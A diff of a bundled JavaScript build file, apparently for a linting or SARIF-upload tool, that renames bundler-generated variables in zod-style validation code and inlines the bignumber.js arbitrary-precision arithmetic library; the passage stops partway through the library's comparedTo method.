@@ -8083,9 +8083,9 @@ function assertNever(_x) {
 }
 function assert(_) {
 }
-function getEnumValues(entries2) {
-  const numericValues = Object.values(entries2).filter((v) => typeof v === "number");
-  const values = Object.entries(entries2).filter(([k, _]) => numericValues.indexOf(+k) === -1).map(([_, v]) => v);
+function getEnumValues(entries3) {
+  const numericValues = Object.values(entries3).filter((v) => typeof v === "number");
+  const values = Object.entries(entries3).filter(([k, _]) => numericValues.indexOf(+k) === -1).map(([_, v]) => v);
   return values;
 }
 function joinValues(array2, separator = "|") {
@@ -9920,16 +9920,16 @@ var $ZodCheckProperties = /* @__PURE__ */ $constructor("$ZodCheckProperties", (i
   hide(inst, Symbol.iterator, function* () {
     yield inst;
   });
-  let entries2;
+  let entries3;
   inst._zod.check = (payload) => {
     if (payload.value == null) {
       payload.issues.push({ expected: "object", code: "invalid_type", input: payload.value, inst });
       return void 0;
     }
-    entries2 ?? (entries2 = Reflect.ownKeys(def.shape).map((key) => [key, def.shape[key]]));
+    entries3 ?? (entries3 = Reflect.ownKeys(def.shape).map((key) => [key, def.shape[key]]));
     const input3 = payload.value;
     let proms;
-    for (const [key, schema] of entries2) {
+    for (const [key, schema] of entries3) {
       const result = schema._zod.run({ value: input3[key], issues: [] }, {});
       if (result instanceof Promise) {
         proms ?? (proms = []);
@@ -20375,9 +20375,9 @@ function compileValidator(schema, parser) {
 function compile(schema, options) {
   try {
     const parser = compileFn(schema);
-    const clone2 = withParser(schema, parser);
-    clone2._zod.bag.validator = compileValidator(schema, parser);
-    return clone2;
+    const clone3 = withParser(schema, parser);
+    clone3._zod.bag.validator = compileValidator(schema, parser);
+    return clone3;
   } catch (err) {
     if (options?.strict)
       throw err;
@@ -20388,7 +20388,7 @@ function withParser(schema, parser) {
   if (isRecursiveSchema(schema)) {
     throw new ZodCompileUnsupportedError("a schema whose subtree contains a reference cycle");
   }
-  const clone2 = clone(schema);
+  const clone3 = clone(schema);
   const liveRun = schema._zod.run;
   const originalRun = liveRun.__originalRun ?? liveRun;
   const wrapped = (payload, ctx) => {
@@ -20408,12 +20408,12 @@ function withParser(schema, parser) {
     return originalRun(payload, ctx);
   };
   wrapped.__originalRun = originalRun;
-  clone2._zod.bag.fallbackRun = originalRun;
-  clone2._zod.bag.validator = parser;
-  clone2._zod.run = wrapped;
+  clone3._zod.bag.fallbackRun = originalRun;
+  clone3._zod.bag.validator = parser;
+  clone3._zod.run = wrapped;
   if (!liveRun.__originalRun)
-    installCompiledUserMethods(clone2, schema, parser);
-  return clone2;
+    installCompiledUserMethods(clone3, schema, parser);
+  return clone3;
 }
 function installCompiledUserMethods(target, source, parser) {
   const targetAny = target;
@@ -22747,18 +22747,18 @@ function _set(Class2, valueType, params) {
 }
 // @__NO_SIDE_EFFECTS__
 function _enum(Class2, values, params) {
-  const entries2 = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
+  const entries3 = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
   return new Class2({
     type: "enum",
-    entries: entries2,
+    entries: entries3,
     ...normalizeParams(params)
   });
 }
 // @__NO_SIDE_EFFECTS__
-function _nativeEnum(Class2, entries2, params) {
+function _nativeEnum(Class2, entries3, params) {
   return new Class2({
     type: "enum",
-    entries: entries2,
+    entries: entries3,
     ...normalizeParams(params)
   });
 }
@@ -25741,17 +25741,17 @@ var ZodEnum = /* @__PURE__ */ $constructor("ZodEnum", (inst, def) => {
   };
 });
 function _enum2(values, params) {
-  const entries2 = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
+  const entries3 = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
   return new ZodEnum({
     type: "enum",
-    entries: entries2,
+    entries: entries3,
     ...util_exports.normalizeParams(params)
   });
 }
-function nativeEnum(entries2, params) {
+function nativeEnum(entries3, params) {
   return new ZodEnum({
     type: "enum",
-    entries: entries2,
+    entries: entries3,
     ...util_exports.normalizeParams(params)
   });
 }
@@ -43281,10 +43281,10 @@ var require__2020 = /* @__PURE__ */ __commonJSMin(((exports, module) => {
 var require_formats = /* @__PURE__ */ __commonJSMin(((exports) => {
   Object.defineProperty(exports, "__esModule", { value: true });
   exports.formatNames = exports.fastFormats = exports.fullFormats = void 0;
-  function fmtDef(validate2, compare2) {
+  function fmtDef(validate2, compare3) {
     return {
       validate: validate2,
-      compare: compare2
+      compare: compare3
     };
   }
   exports.fullFormats = {
@@ -45521,6 +45521,4333 @@ async function uploadSarif(client, repo, options) {
 // src/lint/config.ts
 var import_yaml = __toESM(require_dist2(), 1);
 
+// node_modules/bignumber.js/bignumber.mjs
+var isNumeric = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i;
+var mathceil = Math.ceil;
+var mathfloor = Math.floor;
+var bignumberError = "[BigNumber Error] ";
+var tooManyDigits = bignumberError + "Number primitive has more than 15 significant digits: ";
+var BASE = 1e14;
+var LOG_BASE = 14;
+var MAX_SAFE_INTEGER = 9007199254740991;
+var POWS_TEN = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13];
+var SQRT_BASE = 1e7;
+var MAX = 1e9;
+function clone2(configObject) {
+  var div, convertBase, parseNumeric, P = BigNumber2.prototype = { constructor: BigNumber2, toString: null, valueOf: null }, ONE = new BigNumber2(1), DECIMAL_PLACES = 20, ROUNDING_MODE = 4, TO_EXP_NEG = -7, TO_EXP_POS = 21, MIN_EXP = -1e7, MAX_EXP = 1e7, CRYPTO = false, MODULO_MODE = 1, POW_PRECISION = 0, FORMAT = {
+    prefix: "",
+    groupSize: 3,
+    secondaryGroupSize: 0,
+    groupSeparator: ",",
+    decimalSeparator: ".",
+    fractionGroupSize: 0,
+    fractionGroupSeparator: "\xA0",
+    // non-breaking space
+    suffix: ""
+  }, ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyz", alphabetHasNormalDecimalDigits = true;
+  function BigNumber2(v, b) {
+    var alphabet, c, caseChanged, e, i, isNum, len, str2, x = this;
+    if (!(x instanceof BigNumber2)) return new BigNumber2(v, b);
+    if (b == null) {
+      if (v && v._isBigNumber === true) {
+        x.s = v.s;
+        if (!v.c || v.e > MAX_EXP) {
+          x.c = x.e = null;
+        } else if (v.e < MIN_EXP) {
+          x.c = [x.e = 0];
+        } else {
+          x.e = v.e;
+          x.c = v.c.slice();
+        }
+        return;
+      }
+      if ((isNum = typeof v == "number") && v * 0 == 0) {
+        x.s = 1 / v < 0 ? (v = -v, -1) : 1;
+        if (v === ~~v) {
+          for (e = 0, i = v; i >= 10; i /= 10, e++) ;
+          if (e > MAX_EXP) {
+            x.c = x.e = null;
+          } else {
+            x.e = e;
+            x.c = [v];
+          }
+          return;
+        }
+        str2 = String(v);
+      } else {
+        if (!isNumeric.test(str2 = String(v))) return parseNumeric(x, str2, isNum);
+        x.s = str2.charCodeAt(0) == 45 ? (str2 = str2.slice(1), -1) : 1;
+      }
+      if ((e = str2.indexOf(".")) > -1) str2 = str2.replace(".", "");
+      if ((i = str2.search(/e/i)) > 0) {
+        if (e < 0) e = i;
+        e += +str2.slice(i + 1);
+        str2 = str2.substring(0, i);
+      } else if (e < 0) {
+        e = str2.length;
+      }
+    } else {
+      intCheck(b, 2, ALPHABET.length, "Base");
+      if (b == 10 && alphabetHasNormalDecimalDigits) {
+        x = new BigNumber2(v);
+        return round(x, DECIMAL_PLACES + x.e + 1, ROUNDING_MODE);
+      }
+      str2 = String(v);
+      if (isNum = typeof v == "number") {
+        if (v * 0 != 0) return parseNumeric(x, str2, isNum, b);
+        x.s = 1 / v < 0 ? (str2 = str2.slice(1), -1) : 1;
+        if (BigNumber2.DEBUG && str2.replace(/^0\.0*|\./, "").length > 15) {
+          throw Error(tooManyDigits + v);
+        }
+      } else {
+        x.s = str2.charCodeAt(0) === 45 ? (str2 = str2.slice(1), -1) : 1;
+      }
+      alphabet = ALPHABET.slice(0, b);
+      e = i = 0;
+      for (len = str2.length; i < len; i++) {
+        if (alphabet.indexOf(c = str2.charAt(i)) < 0) {
+          if (c == ".") {
+            if (i > e) {
+              e = len;
+              continue;
+            }
+          } else if (!caseChanged) {
+            if (str2 == str2.toUpperCase() && (str2 = str2.toLowerCase()) || str2 == str2.toLowerCase() && (str2 = str2.toUpperCase())) {
+              caseChanged = true;
+              i = -1;
+              e = 0;
+              continue;
+            }
+          }
+          return parseNumeric(x, String(v), isNum, b);
+        }
+      }
+      isNum = false;
+      str2 = convertBase(str2, b, 10, x.s);
+      if ((e = str2.indexOf(".")) > -1) str2 = str2.replace(".", "");
+      else e = str2.length;
+    }
+    for (i = 0; str2.charCodeAt(i) === 48; i++) ;
+    for (len = str2.length; str2.charCodeAt(--len) === 48; ) ;
+    if (str2 = str2.slice(i, ++len)) {
+      len -= i;
+      if (isNum && BigNumber2.DEBUG && len > 15 && (v > MAX_SAFE_INTEGER || v !== mathfloor(v))) {
+        throw Error(tooManyDigits + x.s * v);
+      }
+      if ((e = e - i - 1) > MAX_EXP) {
+        x.c = x.e = null;
+      } else if (e < MIN_EXP) {
+        x.c = [x.e = 0];
+      } else {
+        x.e = e;
+        x.c = [];
+        i = (e + 1) % LOG_BASE;
+        if (e < 0) i += LOG_BASE;
+        if (i < len) {
+          if (i) x.c.push(+str2.slice(0, i));
+          for (len -= LOG_BASE; i < len; ) {
+            x.c.push(+str2.slice(i, i += LOG_BASE));
+          }
+          i = LOG_BASE - (str2 = str2.slice(i)).length;
+        } else {
+          i -= len;
+        }
+        for (; i--; str2 += "0") ;
+        x.c.push(+str2);
+      }
+    } else {
+      x.c = [x.e = 0];
+    }
+  }
+  BigNumber2.clone = clone2;
+  BigNumber2.ROUND_UP = 0;
+  BigNumber2.ROUND_DOWN = 1;
+  BigNumber2.ROUND_CEIL = 2;
+  BigNumber2.ROUND_FLOOR = 3;
+  BigNumber2.ROUND_HALF_UP = 4;
+  BigNumber2.ROUND_HALF_DOWN = 5;
+  BigNumber2.ROUND_HALF_EVEN = 6;
+  BigNumber2.ROUND_HALF_CEIL = 7;
+  BigNumber2.ROUND_HALF_FLOOR = 8;
+  BigNumber2.EUCLID = 9;
+  BigNumber2.config = BigNumber2.set = function(obj) {
+    var p, v;
+    if (obj != null) {
+      if (typeof obj == "object") {
+        if (obj.hasOwnProperty(p = "DECIMAL_PLACES")) {
+          v = obj[p];
+          intCheck(v, 0, MAX, p);
+          DECIMAL_PLACES = v;
+        }
+        if (obj.hasOwnProperty(p = "ROUNDING_MODE")) {
+          v = obj[p];
+          intCheck(v, 0, 8, p);
+          ROUNDING_MODE = v;
+        }
+        if (obj.hasOwnProperty(p = "EXPONENTIAL_AT")) {
+          v = obj[p];
+          if (v && v.pop) {
+            intCheck(v[0], -MAX, 0, p);
+            intCheck(v[1], 0, MAX, p);
+            TO_EXP_NEG = v[0];
+            TO_EXP_POS = v[1];
+          } else {
+            intCheck(v, -MAX, MAX, p);
+            TO_EXP_NEG = -(TO_EXP_POS = v < 0 ? -v : v);
+          }
+        }
+        if (obj.hasOwnProperty(p = "RANGE")) {
+          v = obj[p];
+          if (v && v.pop) {
+            intCheck(v[0], -MAX, -1, p);
+            intCheck(v[1], 1, MAX, p);
+            MIN_EXP = v[0];
+            MAX_EXP = v[1];
+          } else {
+            intCheck(v, -MAX, MAX, p);
+            if (v) {
+              MIN_EXP = -(MAX_EXP = v < 0 ? -v : v);
+            } else {
+              throw Error(bignumberError + p + " cannot be zero: " + v);
+            }
+          }
+        }
+        if (obj.hasOwnProperty(p = "CRYPTO")) {
+          v = obj[p];
+          if (v === !!v) {
+            if (v) {
+              if (typeof crypto != "undefined" && crypto && (crypto.getRandomValues || crypto.randomBytes)) {
+                CRYPTO = v;
+              } else {
+                CRYPTO = !v;
+                throw Error(bignumberError + "crypto unavailable");
+              }
+            } else {
+              CRYPTO = v;
+            }
+          } else {
+            throw Error(bignumberError + p + " not true or false: " + v);
+          }
+        }
+        if (obj.hasOwnProperty(p = "MODULO_MODE")) {
+          v = obj[p];
+          intCheck(v, 0, 9, p);
+          MODULO_MODE = v;
+        }
+        if (obj.hasOwnProperty(p = "POW_PRECISION")) {
+          v = obj[p];
+          intCheck(v, 0, MAX, p);
+          POW_PRECISION = v;
+        }
+        if (obj.hasOwnProperty(p = "FORMAT")) {
+          v = obj[p];
+          if (typeof v == "object") FORMAT = v;
+          else throw Error(bignumberError + p + " not an object: " + v);
+        }
+        if (obj.hasOwnProperty(p = "ALPHABET")) {
+          v = obj[p];
+          if (typeof v == "string" && !/^.?$|[+\-.\s]|(.).*\1/.test(v)) {
+            alphabetHasNormalDecimalDigits = v.slice(0, 10) == "0123456789";
+            ALPHABET = v;
+          } else {
+            throw Error(bignumberError + p + " invalid: " + v);
+          }
+        }
+      } else {
+        throw Error(bignumberError + "Object expected: " + obj);
+      }
+    }
+    return {
+      DECIMAL_PLACES,
+      ROUNDING_MODE,
+      EXPONENTIAL_AT: [TO_EXP_NEG, TO_EXP_POS],
+      RANGE: [MIN_EXP, MAX_EXP],
+      CRYPTO,
+      MODULO_MODE,
+      POW_PRECISION,
+      FORMAT,
+      ALPHABET
+    };
+  };
+  BigNumber2.isBigNumber = function(v) {
+    if (!v || v._isBigNumber !== true) return false;
+    if (!BigNumber2.DEBUG) return true;
+    var i, n, c = v.c, e = v.e, s = v.s;
+    out: if ({}.toString.call(c) == "[object Array]") {
+      if ((s === 1 || s === -1) && e >= -MAX && e <= MAX && e === mathfloor(e)) {
+        if (c[0] === 0) {
+          if (e === 0 && c.length === 1) return true;
+          break out;
+        }
+        i = (e + 1) % LOG_BASE;
+        if (i < 1) i += LOG_BASE;
+        if (String(c[0]).length == i) {
+          for (i = 0; i < c.length; i++) {
+            n = c[i];
+            if (n < 0 || n >= BASE || n !== mathfloor(n)) break out;
+          }
+          if (n !== 0) return true;
+        }
+      }
+    } else if (c === null && e === null && (s === null || s === 1 || s === -1)) {
+      return true;
+    }
+    throw Error(bignumberError + "Invalid BigNumber: " + v);
+  };
+  BigNumber2.maximum = BigNumber2.max = function() {
+    return maxOrMin(arguments, -1);
+  };
+  BigNumber2.minimum = BigNumber2.min = function() {
+    return maxOrMin(arguments, 1);
+  };
+  BigNumber2.random = (function() {
+    var pow2_53 = 9007199254740992;
+    var random53bitInt = Math.random() * pow2_53 & 2097151 ? function() {
+      return mathfloor(Math.random() * pow2_53);
+    } : function() {
+      return (Math.random() * 1073741824 | 0) * 8388608 + (Math.random() * 8388608 | 0);
+    };
+    return function(dp) {
+      var a, b, e, k, v, i = 0, c = [], rand = new BigNumber2(ONE);
+      if (dp == null) dp = DECIMAL_PLACES;
+      else intCheck(dp, 0, MAX);
+      k = mathceil(dp / LOG_BASE);
+      if (CRYPTO) {
+        if (crypto.getRandomValues) {
+          a = crypto.getRandomValues(new Uint32Array(k *= 2));
+          for (; i < k; ) {
+            v = a[i] * 131072 + (a[i + 1] >>> 11);
+            if (v >= 9e15) {
+              b = crypto.getRandomValues(new Uint32Array(2));
+              a[i] = b[0];
+              a[i + 1] = b[1];
+            } else {
+              c.push(v % 1e14);
+              i += 2;
+            }
+          }
+          i = k / 2;
+        } else if (crypto.randomBytes) {
+          a = crypto.randomBytes(k *= 7);
+          for (; i < k; ) {
+            v = (a[i] & 31) * 281474976710656 + a[i + 1] * 1099511627776 + a[i + 2] * 4294967296 + a[i + 3] * 16777216 + (a[i + 4] << 16) + (a[i + 5] << 8) + a[i + 6];
+            if (v >= 9e15) {
+              crypto.randomBytes(7).copy(a, i);
+            } else {
+              c.push(v % 1e14);
+              i += 7;
+            }
+          }
+          i = k / 7;
+        } else {
+          CRYPTO = false;
+          throw Error(bignumberError + "crypto unavailable");
+        }
+      }
+      if (!CRYPTO) {
+        for (; i < k; ) {
+          v = random53bitInt();
+          if (v < 9e15) c[i++] = v % 1e14;
+        }
+      }
+      k = c[--i];
+      dp %= LOG_BASE;
+      if (k && dp) {
+        v = POWS_TEN[LOG_BASE - dp];
+        c[i] = mathfloor(k / v) * v;
+      }
+      for (; c[i] === 0; c.pop(), i--) ;
+      if (i < 0) {
+        c = [e = 0];
+      } else {
+        for (e = -1; c[0] === 0; c.splice(0, 1), e -= LOG_BASE) ;
+        for (i = 1, v = c[0]; v >= 10; v /= 10, i++) ;
+        if (i < LOG_BASE) e -= LOG_BASE - i;
+      }
+      rand.e = e;
+      rand.c = c;
+      return rand;
+    };
+  })();
+  BigNumber2.sum = function() {
+    var i = 1, args = arguments, sum = new BigNumber2(args[0]);
+    for (; i < args.length; ) sum = sum.plus(args[i++]);
+    return sum;
+  };
+  convertBase = /* @__PURE__ */ (function() {
+    var decimal = "0123456789";
+    function toBaseOut(str2, baseIn, baseOut, alphabet) {
+      var j, arr = [0], arrL, i = 0, len = str2.length;
+      for (; i < len; ) {
+        for (arrL = arr.length; arrL--; arr[arrL] *= baseIn) ;
+        arr[0] += alphabet.indexOf(str2.charAt(i++));
+        for (j = 0; j < arr.length; j++) {
+          if (arr[j] > baseOut - 1) {
+            if (arr[j + 1] == null) arr[j + 1] = 0;
+            arr[j + 1] += arr[j] / baseOut | 0;
+            arr[j] %= baseOut;
+          }
+        }
+      }
+      return arr.reverse();
+    }
+    return function(str2, baseIn, baseOut, sign, callerIsToString) {
+      var alphabet, d, e, k, r, x, xc, y, i = str2.indexOf("."), dp = DECIMAL_PLACES, rm = ROUNDING_MODE;
+      if (i >= 0) {
+        k = POW_PRECISION;
+        POW_PRECISION = 0;
+        str2 = str2.replace(".", "");
+        y = new BigNumber2(baseIn);
+        x = y.pow(str2.length - i);
+        POW_PRECISION = k;
+        y.c = toBaseOut(
+          toFixedPoint(coeffToString(x.c), x.e, "0"),
+          10,
+          baseOut,
+          decimal
+        );
+        y.e = y.c.length;
+      }
+      xc = toBaseOut(str2, baseIn, baseOut, callerIsToString ? (alphabet = ALPHABET, decimal) : (alphabet = decimal, ALPHABET));
+      e = k = xc.length;
+      for (; xc[--k] == 0; xc.pop()) ;
+      if (!xc[0]) return alphabet.charAt(0);
+      if (i < 0) {
+        --e;
+      } else {
+        x.c = xc;
+        x.e = e;
+        x.s = sign;
+        x = div(x, y, dp, rm, baseOut);
+        xc = x.c;
+        r = x.r;
+        e = x.e;
+      }
+      d = e + dp + 1;
+      i = xc[d];
+      k = baseOut / 2;
+      r = r || d < 0 || xc[d + 1] != null;
+      r = rm < 4 ? (i != null || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2)) : i > k || i == k && (rm == 4 || r || rm == 6 && xc[d - 1] & 1 || rm == (x.s < 0 ? 8 : 7));
+      if (d < 1 || !xc[0]) {
+        str2 = r ? toFixedPoint(alphabet.charAt(1), -dp, alphabet.charAt(0)) : alphabet.charAt(0);
+      } else {
+        xc.length = d;
+        if (r) {
+          for (--baseOut; ++xc[--d] > baseOut; ) {
+            xc[d] = 0;
+            if (!d) {
+              ++e;
+              xc = [1].concat(xc);
+            }
+          }
+        }
+        for (k = xc.length; !xc[--k]; ) ;
+        for (i = 0, str2 = ""; i <= k; str2 += alphabet.charAt(xc[i++])) ;
+        str2 = toFixedPoint(str2, e, alphabet.charAt(0));
+      }
+      return str2;
+    };
+  })();
+  div = /* @__PURE__ */ (function() {
+    function multiply(x, k, base2) {
+      var m, temp, xlo, xhi, carry = 0, i = x.length, klo = k % SQRT_BASE, khi = k / SQRT_BASE | 0;
+      for (x = x.slice(); i--; ) {
+        xlo = x[i] % SQRT_BASE;
+        xhi = x[i] / SQRT_BASE | 0;
+        m = khi * xlo + xhi * klo;
+        temp = klo * xlo + m % SQRT_BASE * SQRT_BASE + carry;
+        carry = (temp / base2 | 0) + (m / SQRT_BASE | 0) + khi * xhi;
+        x[i] = temp % base2;
+      }
+      if (carry) x = [carry].concat(x);
+      return x;
+    }
+    function compare3(a, b, aL, bL) {
+      var i, cmp;
+      if (aL != bL) {
+        cmp = aL > bL ? 1 : -1;
+      } else {
+        for (i = cmp = 0; i < aL; i++) {
+          if (a[i] != b[i]) {
+            cmp = a[i] > b[i] ? 1 : -1;
+            break;
+          }
+        }
+      }
+      return cmp;
+    }
+    function subtract(a, b, aL, base2) {
+      var i = 0;
+      for (; aL--; ) {
+        a[aL] -= i;
+        i = a[aL] < b[aL] ? 1 : 0;
+        a[aL] = i * base2 + a[aL] - b[aL];
+      }
+      for (; !a[0] && a.length > 1; a.splice(0, 1)) ;
+    }
+    return function(x, y, dp, rm, base2) {
+      var cmp, e, i, more, n, prod, prodL, q, qc, rem, remL, rem0, xi, xL, yc0, yL, yz, s = x.s == y.s ? 1 : -1, xc = x.c, yc = y.c;
+      if (!xc || !xc[0] || !yc || !yc[0]) {
+        return new BigNumber2(
+          // Return NaN if either NaN, or both Infinity or 0.
+          !x.s || !y.s || (xc ? yc && xc[0] == yc[0] : !yc) ? NaN : (
+            // Return ±0 if x is ±0 or y is ±Infinity, or return ±Infinity as y is ±0.
+            xc && xc[0] == 0 || !yc ? s * 0 : s / 0
+          )
+        );
+      }
+      q = new BigNumber2(s);
+      qc = q.c = [];
+      e = x.e - y.e;
+      s = dp + e + 1;
+      if (!base2) {
+        base2 = BASE;
+        e = bitFloor(x.e / LOG_BASE) - bitFloor(y.e / LOG_BASE);
+        s = s / LOG_BASE | 0;
+      }
+      for (i = 0; yc[i] == (xc[i] || 0); i++) ;
+      if (yc[i] > (xc[i] || 0)) e--;
+      if (s < 0) {
+        qc.push(1);
+        more = true;
+      } else {
+        xL = xc.length;
+        yL = yc.length;
+        i = 0;
+        s += 2;
+        n = mathfloor(base2 / (yc[0] + 1));
+        if (n > 1) {
+          yc = multiply(yc, n, base2);
+          xc = multiply(xc, n, base2);
+          yL = yc.length;
+          xL = xc.length;
+        }
+        xi = yL;
+        rem = xc.slice(0, yL);
+        remL = rem.length;
+        for (; remL < yL; rem[remL++] = 0) ;
+        yz = yc.slice();
+        yz = [0].concat(yz);
+        yc0 = yc[0];
+        if (yc[1] >= base2 / 2) yc0++;
+        do {
+          n = 0;
+          cmp = compare3(yc, rem, yL, remL);
+          if (cmp < 0) {
+            rem0 = rem[0];
+            if (yL != remL) rem0 = rem0 * base2 + (rem[1] || 0);
+            n = mathfloor(rem0 / yc0);
+            if (n > 1) {
+              if (n >= base2) n = base2 - 1;
+              prod = multiply(yc, n, base2);
+              prodL = prod.length;
+              remL = rem.length;
+              while (compare3(prod, rem, prodL, remL) == 1) {
+                n--;
+                subtract(prod, yL < prodL ? yz : yc, prodL, base2);
+                prodL = prod.length;
+                cmp = 1;
+              }
+            } else {
+              if (n == 0) {
+                cmp = n = 1;
+              }
+              prod = yc.slice();
+              prodL = prod.length;
+            }
+            if (prodL < remL) prod = [0].concat(prod);
+            subtract(rem, prod, remL, base2);
+            remL = rem.length;
+            if (cmp == -1) {
+              while (compare3(yc, rem, yL, remL) < 1) {
+                n++;
+                subtract(rem, yL < remL ? yz : yc, remL, base2);
+                remL = rem.length;
+              }
+            }
+          } else if (cmp === 0) {
+            n++;
+            rem = [0];
+          }
+          qc[i++] = n;
+          if (rem[0]) {
+            rem[remL++] = xc[xi] || 0;
+          } else {
+            rem = [xc[xi]];
+            remL = 1;
+          }
+        } while ((xi++ < xL || rem[0] != null) && s--);
+        more = rem[0] != null;
+        if (!qc[0]) qc.splice(0, 1);
+      }
+      if (base2 == BASE) {
+        for (i = 1, s = qc[0]; s >= 10; s /= 10, i++) ;
+        round(q, dp + (q.e = i + e * LOG_BASE - 1) + 1, rm, more);
+      } else {
+        q.e = e;
+        q.r = +more;
+      }
+      return q;
+    };
+  })();
+  function format2(n, i, rm, id) {
+    var c0, e, ne, len, str2;
+    if (rm == null) rm = ROUNDING_MODE;
+    else intCheck(rm, 0, 8);
+    if (!n.c) return n.toString();
+    c0 = n.c[0];
+    ne = n.e;
+    if (i == null) {
+      str2 = coeffToString(n.c);
+      str2 = id == 1 || id == 2 && (ne <= TO_EXP_NEG || ne >= TO_EXP_POS) ? toExponential(str2, ne) : toFixedPoint(str2, ne, "0");
+    } else {
+      n = round(new BigNumber2(n), i, rm);
+      e = n.e;
+      str2 = coeffToString(n.c);
+      len = str2.length;
+      if (id == 1 || id == 2 && (i <= e || e <= TO_EXP_NEG)) {
+        for (; len < i; str2 += "0", len++) ;
+        str2 = toExponential(str2, e);
+      } else {
+        i -= ne + (id === 2 && e > ne);
+        str2 = toFixedPoint(str2, e, "0");
+        if (e + 1 > len) {
+          if (--i > 0) for (str2 += "."; i--; str2 += "0") ;
+        } else {
+          i += e - len;
+          if (i > 0) {
+            if (e + 1 == len) str2 += ".";
+            for (; i--; str2 += "0") ;
+          }
+        }
+      }
+    }
+    return n.s < 0 && c0 ? "-" + str2 : str2;
+  }
+  function maxOrMin(args, n) {
+    var k, y, i = 1, x = new BigNumber2(args[0]);
+    for (; i < args.length; i++) {
+      y = new BigNumber2(args[i]);
+      if (!y.s || (k = compare(x, y)) === n || k === 0 && x.s === n) {
+        x = y;
+      }
+    }
+    return x;
+  }
+  function normalise(n, c, e) {
+    var i = 1, j = c.length;
+    for (; !c[--j]; c.pop()) ;
+    for (j = c[0]; j >= 10; j /= 10, i++) ;
+    if ((e = i + e * LOG_BASE - 1) > MAX_EXP) {
+      n.c = n.e = null;
+    } else if (e < MIN_EXP) {
+      n.c = [n.e = 0];
+    } else {
+      n.e = e;
+      n.c = c;
+    }
+    return n;
+  }
+  parseNumeric = /* @__PURE__ */ (function() {
+    var basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i, dotAfter = /^([^.]+)\.$/, dotBefore = /^\.([^.]+)$/, isInfinityOrNaN = /^-?(Infinity|NaN)$/, whitespaceOrPlus = /^\s*\+(?=[\w.])|^\s+|\s+$/g;
+    return function(x, str2, isNum, b) {
+      var base2, s = isNum ? str2 : str2.replace(whitespaceOrPlus, "");
+      if (isInfinityOrNaN.test(s)) {
+        x.s = isNaN(s) ? null : s < 0 ? -1 : 1;
+      } else {
+        if (!isNum) {
+          s = s.replace(basePrefix, function(m, p1, p2) {
+            base2 = (p2 = p2.toLowerCase()) == "x" ? 16 : p2 == "b" ? 2 : 8;
+            return !b || b == base2 ? p1 : m;
+          });
+          if (b) {
+            base2 = b;
+            s = s.replace(dotAfter, "$1").replace(dotBefore, "0.$1");
+          }
+          if (str2 != s) return new BigNumber2(s, base2);
+        }
+        if (BigNumber2.DEBUG) {
+          throw Error(bignumberError + "Not a" + (b ? " base " + b : "") + " number: " + str2);
+        }
+        x.s = null;
+      }
+      x.c = x.e = null;
+    };
+  })();
+  function round(x, sd, rm, r) {
+    var d, i, j, k, n, ni, rd, xc = x.c, pows10 = POWS_TEN;
+    if (xc) {
+      out: {
+        for (d = 1, k = xc[0]; k >= 10; k /= 10, d++) ;
+        i = sd - d;
+        if (i < 0) {
+          i += LOG_BASE;
+          j = sd;
+          n = xc[ni = 0];
+          rd = mathfloor(n / pows10[d - j - 1] % 10);
+        } else {
+          ni = mathceil((i + 1) / LOG_BASE);
+          if (ni >= xc.length) {
+            if (r) {
+              for (; xc.length <= ni; xc.push(0)) ;
+              n = rd = 0;
+              d = 1;
+              i %= LOG_BASE;
+              j = i - LOG_BASE + 1;
+            } else {
+              break out;
+            }
+          } else {
+            n = k = xc[ni];
+            for (d = 1; k >= 10; k /= 10, d++) ;
+            i %= LOG_BASE;
+            j = i - LOG_BASE + d;
+            rd = j < 0 ? 0 : mathfloor(n / pows10[d - j - 1] % 10);
+          }
+        }
+        r = r || sd < 0 || // Are there any non-zero digits after the rounding digit?
+        // The expression  n % pows10[d - j - 1]  returns all digits of n to the right
+        // of the digit at j, e.g. if n is 908714 and j is 2, the expression gives 714.
+        xc[ni + 1] != null || (j < 0 ? n : n % pows10[d - j - 1]);
+        r = rm < 4 ? (rd || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2)) : rd > 5 || rd == 5 && (rm == 4 || r || rm == 6 && // Check whether the digit to the left of the rounding digit is odd.
+        (i > 0 ? j > 0 ? n / pows10[d - j] : 0 : xc[ni - 1]) % 10 & 1 || rm == (x.s < 0 ? 8 : 7));
+        if (sd < 1 || !xc[0]) {
+          xc.length = 0;
+          if (r) {
+            sd -= x.e + 1;
+            xc[0] = pows10[(LOG_BASE - sd % LOG_BASE) % LOG_BASE];
+            x.e = -sd || 0;
+          } else {
+            xc[0] = x.e = 0;
+          }
+          return x;
+        }
+        if (i == 0) {
+          xc.length = ni;
+          k = 1;
+          ni--;
+        } else {
+          xc.length = ni + 1;
+          k = pows10[LOG_BASE - i];
+          xc[ni] = j > 0 ? mathfloor(n / pows10[d - j] % pows10[j]) * k : 0;
+        }
+        if (r) {
+          for (; ; ) {
+            if (ni == 0) {
+              for (i = 1, j = xc[0]; j >= 10; j /= 10, i++) ;
+              j = xc[0] += k;
+              for (k = 1; j >= 10; j /= 10, k++) ;
+              if (i != k) {
+                x.e++;
+                if (xc[0] == BASE) xc[0] = 1;
+              }
+              break;
+            } else {
+              xc[ni] += k;
+              if (xc[ni] != BASE) break;
+              xc[ni--] = 0;
+              k = 1;
+            }
+          }
+        }
+        for (i = xc.length; xc[--i] === 0; xc.pop()) ;
+      }
+      if (x.e > MAX_EXP) {
+        x.c = x.e = null;
+      } else if (x.e < MIN_EXP) {
+        x.c = [x.e = 0];
+      }
+    }
+    return x;
+  }
+  function valueOf(n) {
+    var str2, e = n.e;
+    if (e === null) return n.toString();
+    str2 = coeffToString(n.c);
+    str2 = e <= TO_EXP_NEG || e >= TO_EXP_POS ? toExponential(str2, e) : toFixedPoint(str2, e, "0");
+    return n.s < 0 ? "-" + str2 : str2;
+  }
+  P.absoluteValue = P.abs = function() {
+    var x = new BigNumber2(this);
+    if (x.s < 0) x.s = 1;
+    return x;
+  };
+  P.comparedTo = function(y, b) {
